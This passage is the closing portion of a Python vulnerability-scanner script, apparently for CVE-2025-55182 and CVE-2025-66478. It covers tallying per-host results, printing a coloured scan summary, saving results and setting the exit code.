                        print_result(result, args.verbose)
                    elif get_error(result):
                        error_count += 1
                        if not args.quiet and args.verbose:
                            tqdm.write("")
                            print_result(result, args.verbose)
                    elif not args.quiet and args.verbose:
                        tqdm.write("")
                        print_result(result, args.verbose)

                    if is_potentially_vulnerable(result):
                        potentially_vulnerable_count += 1

                    pbar.update(1)

    if not args.quiet:
        print()
        print(colorize("=" * 60, Colors.CYAN))
        print(colorize("SCAN SUMMARY", Colors.BOLD))
        print(colorize("=" * 60, Colors.CYAN))
        print(f"  CVEs: CVE-2025-55182, CVE-2025-66478 (CVSS 10.0)")
        print(f"  Total hosts scanned: {len(hosts)}")

        if vulnerable_count > 0:
            print(
                f"  {colorize(f'Vulnerable: {vulnerable_count}', Colors.RED + Colors.BOLD)}"
            )
        else:
            print(f"  Vulnerable: {vulnerable_count}")

        if potentially_vulnerable_count > 0 and args.fingerprint_only:
            print(
                f"  {colorize(f'Potentially vulnerable: {potentially_vulnerable_count}', Colors.YELLOW)}"
            )

        print(f"  Not vulnerable: {len(hosts) - vulnerable_count - error_count}")
        print(f"  Errors: {error_count}")
        print(colorize("=" * 60, Colors.CYAN))

    if args.output:
        save_results(results, args.output, vulnerable_only=not args.all_results)

    if vulnerable_count > 0:
        sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()
